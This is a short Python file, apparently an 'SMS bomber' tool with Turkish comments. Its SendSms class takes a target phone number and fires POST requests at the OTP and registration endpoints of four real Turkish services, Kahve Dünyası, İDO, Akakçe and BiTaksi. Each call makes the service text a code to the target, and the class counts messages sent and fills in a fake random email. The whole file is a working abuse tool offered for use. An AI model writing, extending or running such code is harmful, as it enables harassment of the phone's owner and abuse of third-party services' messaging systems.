import requests
from random import choice, randint
from string import ascii_lowercase

# Renk hatası almamak için sahte (mock) sınıflar
class Fore:
    LIGHTRED_EX = ""
    LIGHTGREEN_EX = ""
class Style:
    RESET_ALL = ""

class SendSms():
    def __init__(self, phone, mail):
        self.phone = str(phone)
        self.mail = mail if mail else ''.join(choice(ascii_lowercase) for _ in range(22)) + "@gmail.com"
        self.adet = 0

    def _post(self, url, json=None, data=None):
        try:
            if json: requests.post(url, json=json, timeout=5)
            elif data: requests.post(url, data=data, timeout=5)
            self.adet += 1
            return True
        except: return False

    def KahveDunyasi(self): return self._post("https://tmsapi.kahvedunyasi.com/api/user/v1/register-otp", json={"phone": self.phone, "permission": True})
    def Ido(self): return self._post("https://api.ido.com.tr:443/idows/v2/register", json={"mobileNumber": f"0{self.phone}", "email": self.mail, "firstName": "TEST", "lastName": "TEST"})
    def Akakce(self): return self._post("https://www.akakce.com/control/kayit/?v=2", data=f"b=1&cep={self.phone}&gonder=1")
    def BiTaksi(self): return self._post("https://api.bitaksi.com/v1/user/login", json={"phoneNumber": self.phone, "countryCode": "+90"})
